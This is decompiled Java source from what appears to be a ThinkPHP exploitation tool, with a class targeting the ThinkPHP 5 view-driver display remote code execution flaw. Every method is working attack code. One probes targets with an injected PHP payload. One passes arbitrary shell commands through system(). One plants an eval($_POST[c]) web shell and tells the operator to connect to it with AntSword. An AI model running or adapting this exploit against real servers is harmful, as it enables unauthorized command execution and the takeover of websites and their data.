/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_driver_display_rce
/*    */   implements BaseExp {
/* 11 */   private String results = null;
/* 12 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 17 */     String payload0 = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E";
/* 18 */     url = url + payload0;
/* 19 */     Response response = HttpTool.get(url, this.property);
/* 20 */     if (response.getText().contains("4f97319b308ed6bd3f0c195c176bbd77")) {
/* 21 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 22 */       return this.results;
/*    */     } 
/* 24 */     if (response.getError() != null) {
/* 25 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 26 */       return this.results;
/*    */     } 
/* 28 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 29 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 34 */     String payload1 = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20system(\"" + cmd + "\")?%3E";
/* 35 */     url = url + payload1;
/* 36 */     Response response = HttpTool.get(url, this.property);
/* 37 */     if (response.getError() == null) {
/* 38 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 40 */       this.results = response.getError();
/*    */     } 
/* 42 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 47 */     String payload = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=${@print(eval($_POST[c]))}";
/* 48 */     Response response = HttpTool.post(url + payload, "c=phpinfo();", this.property);
/* 49 */     if (response.getError() == null && response.getText().contains("PHP Version")) {
/* 50 */       this.results = "[+] 执行成功，请使用蚁剑连接即可, 密码为c ：" + url + payload;
/*    */     } else {
/* 52 */       this.results = "[-] 上传失败: " + response.getError();
/*    */     } 
/* 54 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_driver_display_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */